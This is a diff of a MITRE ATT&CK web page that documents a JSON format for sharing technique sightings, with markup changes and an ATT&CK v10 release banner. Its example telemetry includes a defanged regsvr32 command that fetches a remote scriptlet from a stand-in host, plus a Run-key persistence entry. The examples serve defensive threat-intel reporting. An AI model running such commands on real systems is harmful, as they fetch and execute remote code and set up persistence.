@@ -23,14 +23,17 @@
         <link rel='stylesheet' href='/theme/style/bootstrap.min.css' />
         <link rel='stylesheet' href='/theme/style/bootstrap-glyphicon.min.css' />
         <link rel='stylesheet' href='/theme/style/bootstrap-tourist.css' />
-        <link rel="stylesheet" type="text/css" href="/theme/style.min.css?426cc53a">
+        <link rel="stylesheet" type="text/css" href="/theme/style.min.css?0f4fe4ec">
 </head>
 
 <body>
-<!--stopindex-->
-    <header>
+
+    <div class="container-fluid attack-website-wrapper d-flex flex-column h-100">
+        <div class="row sticky-top flex-grow-0 flex-shrink-1">
+            <!-- header elements -->
+            <header class="col px-0">
     
-            <nav class='navbar navbar-expand-lg navbar-dark fixed-top'>
+                    <nav class='navbar navbar-expand-lg navbar-dark position-static'>
         <a class='navbar-brand' href='/'><img src="/theme/images/mitre_attack_logo.png" class="attack-logo"></a>
         <button class='navbar-toggler' type='button' data-toggle='collapse' data-target='#navbarCollapse'
                 aria-controls='navbarCollapse' aria-expanded='false' aria-label='Toggle navigation'>
@@ -66,6 +69,9 @@
     </div>
 
 
+                        </li>
+                        <li class="nav-item">
+                            <a href="/datasources"  class="nav-link" ><b>Data Sources</b></a>
                         </li>
                         <li class="nav-item dropdown">
                                 
@@ -123,15 +129,24 @@
         </div>
     </nav>
 
-    </header>
-    <!-- don't edit or remove the line below even though it's commented out, it gets parsed and replaced by the versioning feature -->
-    <!-- !versions banner! -->
-
-<div id='content' class="maincontent">
-    <!--start-indexing-for-search-->
+            </header>
+        </div>
+        <div class="row flex-grow-0 flex-shrink-1">
+            <!-- banner elements -->
+            <div class="col px-0">
+                <!-- don't edit or remove the line below even though it's commented out, it gets parsed and replaced by the versioning feature -->
+                <!-- !versions banner! -->
+                    <div class="container-fluid banner-message">
+                        ATT&CK v10 has been released! Check out the <a href='https://medium.com/mitre-attack/introducing-attack-v10-7743870b37e3'>blog post</a> or <a href='https://attack.mitre.org/resources/updates/updates-october-2021/'>release notes</a> for more information.
+                    </div>
+            </div>
+        </div>
+        <div class="row flex-grow-1 flex-shrink-0">
+            <!-- main content elements -->
+            <!--start-indexing-for-search-->
  
          
-    <div class="container">
+    <div class="col container">
         <div class="container-fluid">
             <ol class="breadcrumb">
                 <li class="breadcrumb-item"><a href="/">Home</a></li>
@@ -459,16 +474,16 @@
 <p>Each object in the list of raw data should consist of an object from the <a href="https://car.mitre.org/data_model/">CAR data model</a> in the form "object.action": {"field": "value"}.</p>
 <p>For example:</p>
 <p><strong>Command Line</strong>:</p>
-<div class="highlight"><pre><span></span>&quot;process.create&quot;: {&quot;command_line&quot;: &quot;regsvr32.exe /i:hxxp://lolbad.com scrobj.dll&quot;}
+<div class="highlight"><pre><span></span><span class="err">&quot;process.create&quot;: {&quot;command_line&quot;: &quot;regsvr32.exe /i:hxxp://lolbad.com scrobj.dll&quot;}</span>
 </pre></div>
 
 
 <p><strong>Registry Key</strong>:</p>
-<div class="highlight"><pre><span></span>&quot;registry.add&quot;: {
-    &quot;hive&quot;: &quot;HKEY_CURRENT_USER&quot;,
-    &quot;key&quot;: &quot;\Software\Microsoft\Windows\CurrentVersion\Run&quot;,
-    &quot;value&quot;: &quot;bad.exe&quot;
-}
+<div class="highlight"><pre><span></span><span class="err">&quot;registry.add&quot;: {</span>
+<span class="err">    &quot;hive&quot;: &quot;HKEY_CURRENT_USER&quot;,</span>
+<span class="err">    &quot;key&quot;: &quot;\Software\Microsoft\Windows\CurrentVersion\Run&quot;,</span>
+<span class="err">    &quot;value&quot;: &quot;bad.exe&quot;</span>
+<span class="err">}</span>
 </pre></div>
 
 
@@ -477,81 +492,82 @@
 <h2>Examples</h2>
 <h4>Simple Technique Sighting</h4>
 <p>A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using "at".</p>
-<div class="highlight"><pre><span></span>{
-  &quot;id&quot;: &quot;DT-1234&quot;,
-  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,
-  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;detectionType&quot;: &quot;human-validated&quot;,
-  &quot;techniques&quot;: [
-    {
-      &quot;techniqueID&quot;: &quot;T1088&quot;,
-      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-      &quot;platform&quot;: &quot;Windows 10&quot;,
-      &quot;rawData&quot;: [
-        &quot;process.create&quot;: {&quot;command_line&quot;: &quot;at 13:30 /interactive cmd&quot;}
-      ]
-    }
-  ]
-}
+<div class="highlight"><pre><span></span><span class="err">{</span>
+<span class="err">  &quot;id&quot;: &quot;DT-1234&quot;,</span>
+<span class="err">  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,</span>
+<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;detectionType&quot;: &quot;human-validated&quot;,</span>
+<span class="err">  &quot;techniques&quot;: [</span>
+<span class="err">    {</span>
+<span class="err">      &quot;techniqueID&quot;: &quot;T1088&quot;,</span>
+<span class="err">      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">      &quot;platform&quot;: &quot;Windows 10&quot;,</span>
+<span class="err">      &quot;rawData&quot;: [</span>
+<span class="err">        &quot;process.create&quot;: {&quot;command_line&quot;: &quot;at 13:30 /interactive cmd&quot;}</span>
+<span class="err">      ]</span>
+<span class="err">    }</span>
+<span class="err">  ]</span>
+<span class="err">}</span>
 </pre></div>
 
 
 <h4>Technique Sighting with Attribution</h4>
 <p>An ISAC collects, anonymizes, and redistributes sightings from its members. While it doesn’t receive the raw data, it does have demographic and (sometimes) attribution information.</p>
-<div class="highlight"><pre><span></span>{
-  &quot;id&quot;: &quot;1000&quot;,
-  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,
-  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;detectionType&quot;: &quot;human-validated&quot;,
-  &quot;sectors&quot;: [&quot;finance&quot;],
-  &quot;attributionType&quot;: &quot;group&quot;,
-  &quot;attribution&quot;: &quot;FIN7&quot;,
-  &quot;techniques&quot;: [
-    {
-      &quot;techniqueID&quot;: &quot;T1003&quot;,
-      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-      &quot;platform&quot;: &quot;Windows 10 Enterprise&quot;
-    }
-  ]
-}
+<div class="highlight"><pre><span></span><span class="err">{</span>
+<span class="err">  &quot;id&quot;: &quot;1000&quot;,</span>
+<span class="err">  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,</span>
+<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;detectionType&quot;: &quot;human-validated&quot;,</span>
+<span class="err">  &quot;sectors&quot;: [&quot;finance&quot;],</span>
+<span class="err">  &quot;attributionType&quot;: &quot;group&quot;,</span>
+<span class="err">  &quot;attribution&quot;: &quot;FIN7&quot;,</span>
+<span class="err">  &quot;techniques&quot;: [</span>
+<span class="err">    {</span>
+<span class="err">      &quot;techniqueID&quot;: &quot;T1003&quot;,</span>
+<span class="err">      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">      &quot;platform&quot;: &quot;Windows 10 Enterprise&quot;</span>
+<span class="err">    }</span>
+<span class="err">  ]</span>
+<span class="err">}</span>
 </pre></div>
 
 
 <h4>Malware Blocked by Security Tool</h4>
 <p>A large end-user organization is running an anti-malware service that blocks execution of a Mac malware already in ATT&amp;CK.</p>
-<div class="highlight"><pre><span></span>{
-  &quot;id&quot;: &quot;32&quot;,
-  &quot;sightingType&quot;: &quot;direct-malware-sighting&quot;,
-  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;detectionType&quot;: &quot;raw&quot;,
-  &quot;sectors&quot;: [&quot;healthcare&quot;],
-  &quot;software&quot;: &quot;MacSpy&quot;
-}
+<div class="highlight"><pre><span></span><span class="err">{</span>
+<span class="err">  &quot;id&quot;: &quot;32&quot;,</span>
+<span class="err">  &quot;sightingType&quot;: &quot;direct-malware-sighting&quot;,</span>
+<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;detectionType&quot;: &quot;raw&quot;,</span>
+<span class="err">  &quot;sectors&quot;: [&quot;healthcare&quot;],</span>
+<span class="err">  &quot;software&quot;: &quot;MacSpy&quot;</span>
+<span class="err">}</span>
 </pre></div>
 
 
 <h4>IOC Submission</h4>
 <p>A TIP vendor submits a set of IOCs that have been identified with ATT&amp;CK techniques.</p>
-<div class="highlight"><pre><span></span>{
-  &quot;id&quot;: &quot;32&quot;,
-  &quot;sightingType&quot;: &quot;indirect-malware-sighting&quot;,
-  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
-  &quot;sectors&quot;: [&quot;healthcare&quot;],
-  &quot;software&quot;: &quot;RemCom&quot;,
-  &quot;ioc&quot;: &quot;&lt;some hash&gt;&quot;
-} 
+<div class="highlight"><pre><span></span><span class="err">{</span>
+<span class="err">  &quot;id&quot;: &quot;32&quot;,</span>
+<span class="err">  &quot;sightingType&quot;: &quot;indirect-malware-sighting&quot;,</span>
+<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
+<span class="err">  &quot;sectors&quot;: [&quot;healthcare&quot;],</span>
+<span class="err">  &quot;software&quot;: &quot;RemCom&quot;,</span>
+<span class="err">  &quot;ioc&quot;: &quot;&lt;some hash&gt;&quot;</span>
+<span class="err">} </span>
 </pre></div>
             </div>
         </div>
     </div>
-    <!--stop-indexing-for-search-->
-    <div class="overlay search" id="search-overlay" style="display: none;">
+            <!--stop-indexing-for-search-->
+            <!-- search overlay for entire page -- not displayed inline -->
+            <div class="overlay search" id="search-overlay" style="display: none;">
     <div class="overlay-inner">
         <!-- text input for searching -->
         <div class="search-header">
@@ -575,63 +591,71 @@
     </div>
 </div>
 
-</div>
-<footer class="footer p-3">
-    <div class="container-fluid">
-        <div class="row">
-            <div class="col-4 col-sm-4 col-md-3">  
-                <div class="footer-center-responsive my-auto">
-                    <a href="https://www.mitre.org" target="_blank" rel="noopener" aria-label="MITRE">
-                        <img src="/theme/images/mitrelogowhiteontrans.gif" class="mitre-logo-wtrans">
-                    </a>
-                </div>
-            </div>
-            <div class="col-2 col-sm-2 footer-responsive-break"></div>
-            <div class="col-6 col-sm-6 text-center">  
-                <p>
-                     © 2015-2021, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.
-                </p>
-                <div class="row">
+        </div>
+        <div class="row flex-grow-0 flex-shrink-1">
+            <!-- footer elements -->
+            <footer class="col footer p-3">
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col-4 col-sm-4 col-md-3">  
+                            <div class="footer-center-responsive my-auto">
+                                <a href="https://www.mitre.org" target="_blank" rel="noopener" aria-label="MITRE">
+                                    <img src="/theme/images/mitrelogowhiteontrans.gif" class="mitre-logo-wtrans">
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-2 col-sm-2 footer-responsive-break"></div>
+                        <div class="col-6 col-sm-6 text-center">  
+                            <p>
+                                 © 2015-2021, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.
+                            </p>
+                            <div class="row">
                     
-                    <div class="col text-right">
-                        <small>
-                            <a href="/resources/privacy" class="footer-link">Privacy Policy</a>
-                        </small>
-                    </div>
-                    <div class="col text-center">
-                        <small>
-                            <a href="/resources/terms-of-use" class="footer-link">Terms of Use</a>
-                        </small>
-                    </div>
-                    <div class="col  text-left ">
-                        <small>
-                            <a href="/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" title="ATT&amp;CK content version 9.0&#013;Website version 3.3.1">ATT&CK v9.0</a>
-                        </small>
-                    </div>
-
-                </div>
-            </div>
-            <div class="w-100 p-2 footer-responsive-break"></div>
-                <div class="col">
-                    <div class="footer-float-right-responsive-brand">
-                        <div class="mb-1">
-                            <a href="https://twitter.com/MITREattack" class="btn btn-primary w-100">
-                                <!-- <i class="fa fa-twitter"></i> -->
-                                <img src="/theme/images/twitter.png" class="mr-1 twitter-icon">
-                                <b>@MITREattack</b>
-                            </a>
+                                <div class="col text-right">
+                                    <small>
+                                        <a href="/resources/privacy" class="footer-link">Privacy Policy</a>
+                                    </small>
+                                </div>
+                                <div class="col text-center">
+                                    <small>
+                                        <a href="/resources/terms-of-use" class="footer-link">Terms of Use</a>
+                                    </small>
+                                </div>
+                                <div class="col  text-left ">
+                                    <small>
+                                        <a href="/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" title="ATT&amp;CK content version 10.0&#013;Website version 3.4.0">ATT&CK v10.0</a>
+                                    </small>
+                                </div>
+            
+                            </div>
                         </div>
-                        <div class="">
-                            <a href="/contact" class="btn btn-primary w-100">
-                                Contact
-                            </a>
+                        <div class="w-100 p-2 footer-responsive-break"></div>
+                            <div class="col">
+                                <div class="footer-float-right-responsive-brand">
+                                    <div class="mb-1">
+                                        <a href="https://twitter.com/MITREattack" class="btn btn-primary w-100">
+                                            <!-- <i class="fa fa-twitter"></i> -->
+                                            <img src="/theme/images/twitter.png" class="mr-1 twitter-icon">
+                                            <b>@MITREattack</b>
+                                        </a>
+                                    </div>
+                                    <div class="">
+                                        <a href="/contact" class="btn btn-primary w-100">
+                                            Contact
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
-            </div>
+            </footer>
         </div>
     </div>
-</footer>
+
+
+<!--stopindex-->
+
 </div>
      <!--SCRIPTS-->
     <script src="/theme/scripts/jquery-3.5.1.min.js"></script>
@@ -640,7 +664,7 @@
     <script src="/theme/scripts/site.js"></script>
     <script src="/theme/scripts/flexsearch.es5.js"></script> 
     <script src="/theme/scripts/localforage.min.js"></script>
-    <script src="/theme/scripts/settings.js?2817"></script>
+    <script src="/theme/scripts/settings.js?3771"></script>
     <script src="/theme/scripts/search_babelized.js"></script>
 
 <script src="/theme/scripts/tables.js"></script></body>
